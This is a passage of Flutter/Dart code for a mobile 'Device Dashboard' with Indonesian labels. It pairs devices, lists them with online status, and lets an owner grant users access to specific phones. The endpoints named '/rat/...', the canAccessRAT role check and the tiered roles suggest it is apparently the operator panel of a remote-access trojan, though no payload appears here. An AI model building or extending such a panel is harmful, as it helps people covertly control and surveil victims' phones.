                          hintStyle: TextStyle(
                            color: DashboardTheme.textMuted,
                            fontFamily: 'Astral',
                          ),
                          prefixIcon: Icon(Icons.person_add_rounded, color: DashboardTheme.red, size: 18),
                          border: InputBorder.none,
                          contentPadding: const EdgeInsets.symmetric(vertical: 12, horizontal: 4),
                        ),
                      ),
                    ),
                    GestureDetector(
                      onTap: () => _addUser(_inputVal),
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
                        margin: const EdgeInsets.all(4),
                        decoration: BoxDecoration(
                          gradient: const LinearGradient(
                            colors: [DashboardTheme.red, DashboardTheme.border],
                          ),
                          borderRadius: BorderRadius.circular(12),
                          boxShadow: ShadowUtils.soft,
                          border: Border.all(
                            color: DashboardTheme.border.withOpacity(0.3),
                            width: 0.5,
                          ),
                        ),
                        child: const Text(
                          'TAMBAH',
                          style: TextStyle(
                            color: Colors.white,
                            fontSize: 12,
                            fontWeight: FontWeight.bold,
                            fontFamily: 'Astral',
                          ),
                        ),
                      ),
                    ),
                  ],
                ),
              ),
              const SizedBox(height: 16),
              Expanded(
                child: _loading
                    ? const Center(
                        child: CircularProgressIndicator(
                          color: DashboardTheme.red,
                        ),
                      )
                    : _users.isEmpty
                        ? Center(
                            child: Column(
                              mainAxisSize: MainAxisSize.min,
                              children: [
                                const Icon(Icons.group_off_rounded, color: DashboardTheme.textMuted, size: 48),
                                const SizedBox(height: 12),
                                Text(
                                  'Belum ada user',
                                  style: TextStyle(
                                    color: DashboardTheme.textSecondary,
                                    fontSize: 14,
                                    fontFamily: 'Astral',
                                  ),
                                ),
                                const SizedBox(height: 4),
                                Text(
                                  'Tambahkan user untuk memberi akses device',
                                  style: TextStyle(
                                    color: DashboardTheme.textMuted,
                                    fontSize: 11,
                                    fontFamily: 'Astral',
                                  ),
                                ),
                              ],
                            ),
                          )
                        : SingleChildScrollView(
                            padding: const EdgeInsets.symmetric(horizontal: 20),
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                const Text(
                                  'DAFTAR USER',
                                  style: TextStyle(
                                    color: DashboardTheme.textSecondary,
                                    fontSize: 10,
                                    letterSpacing: 1.5,
                                    fontWeight: FontWeight.w600,
                                    fontFamily: 'Astral',
                                  ),
                                ),
                                const SizedBox(height: 10),
                                Wrap(
                                  spacing: 8,
                                  runSpacing: 8,
                                  children: _users.map((u) {
                                    final active = u == _selectedUser;
                                    final appr = _approved(u);
                                    return GestureDetector(
                                      onTap: () => setState(() => _selectedUser = u),
                                      child: AnimatedContainer(
                                        duration: const Duration(milliseconds: 200),
                                        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
                                        decoration: BoxDecoration(
                                          gradient: active
                                              ? const LinearGradient(
                                                  colors: [DashboardTheme.red, DashboardTheme.border],
                                                )
                                              : null,
                                          color: active ? null : DashboardTheme.surface2,
                                          borderRadius: BorderRadius.circular(20),
                                          border: Border.all(
                                            color: active
                                                ? DashboardTheme.border.withOpacity(0.3)
                                                : (appr ? DashboardTheme.success.withOpacity(0.2) : DashboardTheme.error.withOpacity(0.2)),
                                            width: active ? 1.5 : 1,
                                          ),
                                          boxShadow: active ? ShadowUtils.soft : null,
                                        ),
                                        child: Row(
                                          mainAxisSize: MainAxisSize.min,
                                          children: [
                                            Container(
                                              width: 6,
                                              height: 6,
                                              decoration: BoxDecoration(
                                                color: appr ? DashboardTheme.success : DashboardTheme.error,
                                                shape: BoxShape.circle,
                                                boxShadow: [
                                                  BoxShadow(
                                                    color: (appr ? DashboardTheme.success : DashboardTheme.error).withOpacity(0.4),
                                                    blurRadius: 4,
                                                  ),
                                                ],
                                              ),
                                            ),
                                            const SizedBox(width: 8),
                                            Text(
                                              u,
                                              style: TextStyle(
                                                color: active ? Colors.white : DashboardTheme.textSecondary,
                                                fontSize: 12,
                                                fontWeight: FontWeight.w600,
                                                fontFamily: 'Astral',
                                              ),
                                            ),
                                          ],
                                        ),
                                      ),
                                    );
                                  }).toList(),
                                ),
                                
                                if (_selectedUser.isNotEmpty) ...[
                                  const SizedBox(height: 20),
                                  Container(
                                    padding: const EdgeInsets.all(16),
                                    decoration: BoxDecoration(
                                      gradient: LinearGradient(
                                        colors: [DashboardTheme.surface2, DashboardTheme.surface3],
                                        begin: Alignment.topLeft,
                                        end: Alignment.bottomRight,
                                      ),
                                      borderRadius: BorderRadius.circular(20),
                                      border: Border.all(
                                        color: DashboardTheme.red.withOpacity(0.2),
                                        width: 0.5,
                                      ),
                                      boxShadow: ShadowUtils.medium,
                                    ),
                                    child: Column(
                                      crossAxisAlignment: CrossAxisAlignment.start,
                                      children: [
                                        Row(
                                          mainAxisAlignment: MainAxisAlignment.spaceBetween,
                                          children: [
                                            Row(
                                              children: [
                                                Container(
                                                  padding: const EdgeInsets.all(8),
                                                  decoration: BoxDecoration(
                                                    gradient: LinearGradient(
                                                      colors: [
                                                        _approved(_selectedUser) ? DashboardTheme.success : DashboardTheme.error,
                                                        _approved(_selectedUser) ? DashboardTheme.success : DashboardTheme.error,
                                                      ],
                                                    ),
                                                    borderRadius: BorderRadius.circular(12),
                                                  ),
                                                  child: const Icon(
                                                    Icons.person_rounded,
                                                    color: Colors.white,
                                                    size: 16,
                                                  ),
                                                ),
                                                const SizedBox(width: 12),
                                                Text(
                                                  _selectedUser,
                                                  style: TextStyle(
                                                    color: DashboardTheme.textPrimary,
                                                    fontSize: 14,
                                                    fontWeight: FontWeight.bold,
                                                    fontFamily: 'Astral',
                                                  ),
                                                ),
                                              ],
                                            ),
                                            GestureDetector(
                                              onTap: () => _removeUser(_selectedUser),
                                              child: Container(
                                                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                                                decoration: BoxDecoration(
                                                  color: DashboardTheme.error.withOpacity(0.08),
                                                  borderRadius: BorderRadius.circular(10),
                                                  border: Border.all(
                                                    color: DashboardTheme.error.withOpacity(0.2),
                                                    width: 1,
                                                  ),
                                                ),
                                                child: Row(
                                                  children: const [
                                                    Icon(Icons.delete_outline_rounded, color: DashboardTheme.error, size: 14),
                                                    SizedBox(width: 4),
                                                    Text('Hapus', style: TextStyle(color: DashboardTheme.error, fontSize: 11, fontFamily: 'Astral')),
                                                  ],
                                                ),
                                              ),
                                            ),
                                          ],
                                        ),
                                        const SizedBox(height: 16),
                                        const Divider(color: DashboardTheme.surface3),
                                        const SizedBox(height: 12),
                                        Row(
                                          mainAxisAlignment: MainAxisAlignment.spaceBetween,
                                          children: [
                                            Column(
                                              crossAxisAlignment: CrossAxisAlignment.start,
                                              children: [
                                                const Text(
                                                  'IZINKAN AKSES',
                                                  style: TextStyle(
                                                    color: DashboardTheme.textSecondary,
                                                    fontSize: 10,
                                                    letterSpacing: 1,
                                                    fontFamily: 'Astral',
                                                  ),
                                                ),
                                                const SizedBox(height: 4),
                                                Text(
                                                  _approved(_selectedUser) ? 'User dapat mengakses device' : 'Akses ditolak',
                                                  style: TextStyle(
                                                    color: _approved(_selectedUser) ? DashboardTheme.success : DashboardTheme.error,
                                                    fontSize: 11,
                                                    fontWeight: FontWeight.w500,
                                                    fontFamily: 'Astral',
                                                  ),
                                                ),
                                              ],
                                            ),
                                            Switch(
                                              value: _approved(_selectedUser),
                                              activeColor: DashboardTheme.success,
                                              activeTrackColor: DashboardTheme.success.withOpacity(0.2),
                                              inactiveThumbColor: DashboardTheme.error,
                                              inactiveTrackColor: DashboardTheme.error.withOpacity(0.2),
                                              onChanged: (v) => _update(_selectedUser, approved: v),
                                            ),
                                          ],
                                        ),
                                      ],
                                    ),
                                  ),
                                  
                                  if (_approved(_selectedUser) && widget.allDevices.isNotEmpty) ...[
                                    const SizedBox(height: 16),
                                    Container(
                                      padding: const EdgeInsets.all(16),
                                      decoration: BoxDecoration(
                                        gradient: LinearGradient(
                                          colors: [DashboardTheme.surface2, DashboardTheme.surface3],
                                          begin: Alignment.topLeft,
                                          end: Alignment.bottomRight,
                                        ),
                                        borderRadius: BorderRadius.circular(20),
                                        border: Border.all(
                                          color: DashboardTheme.red.withOpacity(0.2),
                                          width: 0.5,
                                        ),
                                        boxShadow: ShadowUtils.medium,
                                      ),
                                      child: Column(
                                        crossAxisAlignment: CrossAxisAlignment.start,
                                        children: [
                                          Row(
                                            children: [
                                              const Icon(Icons.phone_android_rounded, color: DashboardTheme.red, size: 16),
                                              const SizedBox(width: 8),
                                              const Text(
                                                'DEVICE YANG DAPAT DIAKSES',
                                                style: TextStyle(
                                                  color: DashboardTheme.textSecondary,
                                                  fontSize: 10,
                                                  letterSpacing: 1,
                                                  fontFamily: 'Astral',
                                                ),
                                              ),
                                              const Spacer(),
                                              Text(
                                                '${_devices(_selectedUser).length} / ${widget.allDevices.length}',
                                                style: TextStyle(
                                                  color: DashboardTheme.red,
                                                  fontSize: 11,
                                                  fontWeight: FontWeight.bold,
                                                  fontFamily: 'Astral',
                                                ),
                                              ),
                                            ],
                                          ),
                                          const SizedBox(height: 12),
                                          ListView.builder(
                                            shrinkWrap: true,
                                            physics: const NeverScrollableScrollPhysics(),
                                            itemCount: widget.allDevices.length,
                                            itemBuilder: (ctx, i) {
                                              final d = widget.allDevices[i];
                                              final id = d['id']?.toString() ?? '';
                                              final model = d['model']?.toString() ?? 'Unknown';
                                              final allowed = _devices(_selectedUser).contains(id);
                                              return Container(
                                                margin: const EdgeInsets.only(bottom: 8),
                                                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
                                                decoration: BoxDecoration(
                                                  color: allowed ? DashboardTheme.red.withOpacity(0.04) : DashboardTheme.surface3,
                                                  borderRadius: BorderRadius.circular(12),
                                                  border: Border.all(
                                                    color: allowed ? DashboardTheme.red.withOpacity(0.2) : DashboardTheme.surface3,
                                                    width: allowed ? 1.5 : 1,
                                                  ),
                                                ),
                                                child: Row(
                                                  children: [
                                                    Icon(
                                                      Icons.phone_android_rounded,
                                                      color: allowed ? DashboardTheme.red : DashboardTheme.textMuted,
                                                      size: 18,
                                                    ),
                                                    const SizedBox(width: 12),
                                                    Expanded(
                                                      child: Column(
                                                        crossAxisAlignment: CrossAxisAlignment.start,
                                                        children: [
                                                          Text(
                                                            model,
                                                            style: TextStyle(
                                                              color: allowed ? DashboardTheme.textPrimary : DashboardTheme.textSecondary,
                                                              fontSize: 12,
                                                              fontWeight: FontWeight.w500,
                                                              fontFamily: 'Astral',
                                                            ),
                                                            maxLines: 1,
                                                            overflow: TextOverflow.ellipsis,
                                                          ),
                                                          Text(
                                                            'ID: ${id.length > 12 ? '...${id.substring(id.length - 10)}' : id}',
                                                            style: TextStyle(
                                                              color: DashboardTheme.textMuted,
                                                              fontSize: 9,
                                                              fontFamily: 'Astral',
                                                            ),
                                                          ),
                                                        ],
                                                      ),
                                                    ),
                                                    Checkbox(
                                                      value: allowed,
                                                      activeColor: DashboardTheme.red,
                                                      checkColor: Colors.white,
                                                      side: BorderSide(color: DashboardTheme.textMuted),
                                                      onChanged: (v) async {
                                                        final cur = List<String>.from(_devices(_selectedUser));
                                                        if (v == true) {
                                                          if (!cur.contains(id)) cur.add(id);
                                                        } else {
                                                          cur.remove(id);
                                                        }
                                                        await _update(_selectedUser, devices: cur);
                                                      },
                                                    ),
                                                  ],
                                                ),
                                              );
                                            },
                                          ),
                                        ],
                                      ),
                                    ),
                                  ],
                                ],
                              ],
                            ),
                          ),
              ),
              const SizedBox(height: 20),
            ],
          ),
        ),
      ),
    );
  }
}

// ============================================================================
// MAIN DASHBOARD
// ============================================================================
class DeviceDashboardPage extends StatefulWidget {
  final String username;
  final String role;
  final String sessionKey;
  
  const DeviceDashboardPage({
    super.key,
    this.username = '',
    this.role = '',
    this.sessionKey = '',
  });

  @override
  State<DeviceDashboardPage> createState() => _DDState();
}

class _DDState extends State<DeviceDashboardPage> {
  List<dynamic> _visible = [];
  bool _loading = true;
  String? _errorMsg;
  String _pairId = '';
  PermissionResult? _perm;
  Timer? _timer;
  late PageController _pageController;
  int _currentPage = 0;

  bool get _isOwner => widget.role.toLowerCase() == 'owner';
  bool get _isAllowed => canAccessRAT(widget.role);
  bool get _denied => !_isAllowed && !_isOwner;

  @override
  void initState() {
    super.initState();
    _pageController = PageController();
    _loadAll();
    _timer = Timer.periodic(const Duration(seconds: 20), (_) => _loadAll());
  }

  @override
  void dispose() {
    _timer?.cancel();
    _pageController.dispose();
    super.dispose();
  }

  Future<void> _loadAll() async {
    if (!mounted) return;
    
    if (_denied) {
      setState(() {
        _loading = false;
        _errorMsg = 'Akses ditolak! Hanya role tertentu yang bisa mengakses fitur ini.';
      });
      return;
    }
    
    try {
      final pRes = await http
          .get(Uri.parse('$_kBase/rat/pairid?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 8));
      if (pRes.statusCode == 200) {
        final pd = jsonDecode(pRes.body);
        if (pd['valid'] == true && pd['pairId'] != null) {
          if (mounted) setState(() => _pairId = pd['pairId'].toString());
        }
      }

      final dRes = await http
          .get(Uri.parse('$_kBase/rat/my-devices?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 10));

      if (!mounted) return;
      if (dRes.statusCode != 200) {
        setState(() {
          _loading = false;
          _errorMsg = 'Server error ${dRes.statusCode}';
        });
        return;
      }

      final body = jsonDecode(dRes.body);
      if (body['valid'] != true) {
        setState(() {
          _loading = false;
          _errorMsg = body['message'] ?? 'Error';
        });
        return;
      }

      List<dynamic> devices = List<dynamic>.from(body['devices'] ?? []);
      final now = DateTime.now();
      for (var d in devices) {
        try {
          final seen = DateTime.parse(d['lastSeen']?.toString() ?? '');
          d['online'] = now.difference(seen).inSeconds < 30;
        } catch (_) {
          d['online'] = false;
        }
      }

      PermissionResult perm;
      if (_isOwner || _isAllowed) {
        perm = PermissionResult(approved: true, allDevices: true, devices: []);
      } else {
        perm = await DevicePermissionStore.getFor(widget.username, widget.sessionKey);
      }

      if (mounted) setState(() {
        _visible = devices;
        _perm = perm;
        _loading = false;
        _errorMsg = null;
      });
    } catch (e) {
      if (mounted) setState(() {
        _loading = false;
        _errorMsg = e.toString();
      });
    }
  }

  void _copyPairId() {
    if (_pairId.isEmpty) return;
    Clipboard.setData(ClipboardData(text: _pairId));
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        backgroundColor: DashboardTheme.red,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        content: Row(
          children: const [
            Icon(Icons.copy_rounded, color: Colors.white, size: 18),
            SizedBox(width: 8),
            Text('ID Pairing berhasil disalin!', style: TextStyle(fontFamily: 'Astral')),
          ],
        ),
        duration: const Duration(seconds: 2),
      ),
    );
  }

  void _openPermissionBottomSheet() {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (_) => _PermissionBottomSheet(
        sessionKey: widget.sessionKey,
        allDevices: _visible,
      ),
    ).then((_) => _loadAll());
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: DashboardTheme.bg,
      appBar: _buildAppBar(),
      body: _loading
          ? Center(
              child: Container(
                width: 60,
                height: 60,
                decoration: BoxDecoration(
                  gradient: const LinearGradient(
                    colors: [DashboardTheme.red, DashboardTheme.border],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  ),
                  borderRadius: BorderRadius.circular(16),
                  boxShadow: ShadowUtils.heavy,
                  border: Border.all(
                    color: DashboardTheme.border.withOpacity(0.3),
                    width: 1,
                  ),
                ),
                child: const Center(
                  child: SizedBox(
                    width: 28,
                    height: 28,
                    child: CircularProgressIndicator(
                      strokeWidth: 2.5,
                      color: Colors.white,
                    ),
                  ),
                ),
              ),
            )
          : _errorMsg != null
              ? _buildErrorView()
              : Stack(
                  children: [
                    Column(
                      children: [
                        Container(
                          margin: const EdgeInsets.only(top: 16),
                          child: Row(
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: [
                              _PageDot(isActive: _currentPage == 0, color: DashboardTheme.red),
                              const SizedBox(width: 8),
                              _PageDot(isActive: _currentPage == 1, color: DashboardTheme.border),
                            ],
                          ),
                        ),
                        const SizedBox(height: 8),
                        Expanded(
                          child: PageView(
                            controller: _pageController,
                            onPageChanged: (page) {
                              setState(() => _currentPage = page);
                            },
                            children: [
                              _PairingInfoPage(
                                pairId: _pairId,
                                onCopy: _copyPairId,
                                isOwner: _isOwner,
                              ),
                              _DeviceListPage(
                                devices: _visible,
                                role: widget.role,
                                isOwner: _isOwner,
                                perm: _perm,
                                denied: _denied,
                              ),
                            ],
                          ),
                        ),
                      ],
                    ),
                    if (_isOwner && !_loading && _errorMsg == null)
                      Positioned(
                        left: 16,
                        bottom: 16,
                        child: GestureDetector(
                          onTap: _openPermissionBottomSheet,
                          child: Container(
                            padding: const EdgeInsets.all(14),
                            decoration: BoxDecoration(
                              gradient: const LinearGradient(
                                colors: [DashboardTheme.red, DashboardTheme.border, DashboardTheme.red],
                                begin: Alignment.topLeft,
                                end: Alignment.bottomRight,
                              ),
                              borderRadius: BorderRadius.circular(16),
                              boxShadow: ShadowUtils.heavy,
                              border: Border.all(
                                color: DashboardTheme.border.withOpacity(0.3),
                                width: 1,
                              ),
                            ),
                            child: Row(
                              mainAxisSize: MainAxisSize.min,
                              children: [
                                const Icon(
                                  Icons.monitor_heart_rounded,
                                  color: Colors.white,
                                  size: 22,
                                ),
                                const SizedBox(width: 8),
                                Text(
                                  'KELOLA AKSES',
                                  style: TextStyle(
                                    color: DashboardTheme.border,
                                    fontSize: 11,
                                    fontWeight: FontWeight.bold,
                                    letterSpacing: 1,
                                    fontFamily: 'Astral',
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ),
                      ),
                  ],
                ),
    );
  }

  PreferredSizeWidget _buildAppBar() {
    return AppBar(
      backgroundColor: DashboardTheme.card,
      elevation: 0,
      leading: const SizedBox(),
      title: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(6),
            decoration: BoxDecoration(
              gradient: const LinearGradient(
                colors: [DashboardTheme.red, DashboardTheme.border],
              ),
              borderRadius: BorderRadius.circular(8),
              border: Border.all(
                color: DashboardTheme.border.withOpacity(0.3),
                width: 0.5,
              ),
            ),
            child: const Icon(Icons.dashboard_rounded, color: Colors.white, size: 16),
          ),
          const SizedBox(width: 10),
          Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(
                'DEVICE DASHBOARD',
                style: TextStyle(
                  color: DashboardTheme.textMuted,
                  fontSize: 10,
                  letterSpacing: 1.5,
                  fontWeight: FontWeight.w600,
                  fontFamily: 'Astral',
                ),
              ),
              Text(
                '@${widget.username}',
                style: TextStyle(
                  color: DashboardTheme.textSecondary,
                  fontSize: 11,
                  fontFamily: 'Astral',
                ),
              ),
            ],
          ),
        ],
      ),
      actions: [
        Container(
          margin: const EdgeInsets.only(right: 8),
          child: IconButton(
            icon: const Icon(Icons.refresh_rounded, color: DashboardTheme.red),
            onPressed: () {
              setState(() => _loading = true);
              _loadAll();
            },
          ),
        ),
        const SizedBox(width: 4),
      ],
      bottom: PreferredSize(
        preferredSize: const Size.fromHeight(1),
        child: Container(
          height: 1,
          decoration: BoxDecoration(
            gradient: LinearGradient(
              colors: [Colors.transparent, DashboardTheme.red, Colors.transparent],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildErrorView() {
    final isDenied = _errorMsg?.contains('Akses ditolak') ?? false;
    
    return Center(
      child: Container(
        margin: const EdgeInsets.all(24),
        padding: const EdgeInsets.all(24),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            colors: [DashboardTheme.surface2, DashboardTheme.surface3],
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
          ),
          borderRadius: BorderRadius.circular(20),
          boxShadow: ShadowUtils.heavy,
          border: Border.all(
            color: isDenied ? DashboardTheme.error.withOpacity(0.3) : DashboardTheme.red.withOpacity(0.2),
            width: isDenied ? 2 : 1.5,
          ),
        ),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: isDenied ? DashboardTheme.error.withOpacity(0.12) : DashboardTheme.error.withOpacity(0.08),
                shape: BoxShape.circle,
                border: Border.all(
                  color: isDenied ? DashboardTheme.error.withOpacity(0.4) : DashboardTheme.error.withOpacity(0.2),
                  width: 1,
                ),
              ),
              child: Icon(
                isDenied ? Icons.lock_rounded : Icons.error_rounded,
                color: DashboardTheme.error,
                size: 48,
              ),
            ),
            const SizedBox(height: 20),
            Text(
              isDenied ? 'AKSES DITOLAK' : 'TERJADI KESALAHAN',
              style: TextStyle(
                color: DashboardTheme.error,
                fontSize: 16,
                fontWeight: FontWeight.bold,
                letterSpacing: 1,
                fontFamily: 'Astral',
              ),
            ),
            const SizedBox(height: 8),
            Text(
              isDenied 
                  ? 'Fitur ini hanya bisa diakses oleh Developer, Founder, Kingz, High Owner, Owner, TK, dan Admin.\n\nHubungi Owner untuk mendapatkan akses.'
                  : (_errorMsg ?? 'Unknown error'),
              textAlign: TextAlign.center,
              style: TextStyle(
                color: DashboardTheme.textMuted,
                fontSize: 12,
                fontFamily: 'Astral',
              ),
            ),
            const SizedBox(height: 20),
            if (!isDenied)
              GestureDetector(
                onTap: () {
                  setState(() {
                    _loading = true;
                    _errorMsg = null;
                  });
                  _loadAll();
                },
                child: Container(
                  padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
                  decoration: BoxDecoration(
                    gradient: const LinearGradient(
                      colors: [DashboardTheme.red, DashboardTheme.border],
                    ),
                    borderRadius: BorderRadius.circular(24),
                    boxShadow: ShadowUtils.soft,
                    border: Border.all(
                      color: DashboardTheme.border.withOpacity(0.3),
                      width: 0.5,
                    ),
                  ),
                  child: const Text(
                    'COBA LAGI',
                    style: TextStyle(
                      color: Colors.white,
                      fontWeight: FontWeight.bold,
                      fontFamily: 'Astral',
                    ),
                  ),
                ),
              ),
            if (isDenied)
              GestureDetector(
                onTap: () => Navigator.pop(context),
                child: Container(
                  padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
                  decoration: BoxDecoration(
                    gradient: const LinearGradient(
                      colors: [DashboardTheme.red, DashboardTheme.border],
                    ),
                    borderRadius: BorderRadius.circular(24),
                    boxShadow: ShadowUtils.soft,
                    border: Border.all(
                      color: DashboardTheme.border.withOpacity(0.3),
                      width: 0.5,
                    ),
                  ),
                  child: const Text(
                    'KEMBALI',
                    style: TextStyle(
                      color: Colors.white,
                      fontWeight: FontWeight.bold,
                      fontFamily: 'Astral',
                    ),
                  ),
                ),
              ),
          ],
        ),
      ),
    );
  }
}

class _PageDot extends StatelessWidget {
  final bool isActive;
  final Color color;
  
  const _PageDot({
    required this.isActive,
    required this.color,
  });

  @override
  Widget build(BuildContext context) {
    return AnimatedContainer(
      duration: const Duration(milliseconds: 200),
      width: isActive ? 24 : 6,
      height: 6,
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(3),
        gradient: isActive
            ? LinearGradient(
                colors: [color, color],
              )
            : null,
        color: isActive ? null : DashboardTheme.textMuted.withOpacity(0.2),
        boxShadow: isActive
            ? [BoxShadow(color: color.withOpacity(0.4), blurRadius: 6)]
            : [],
      ),
    );
  }
}
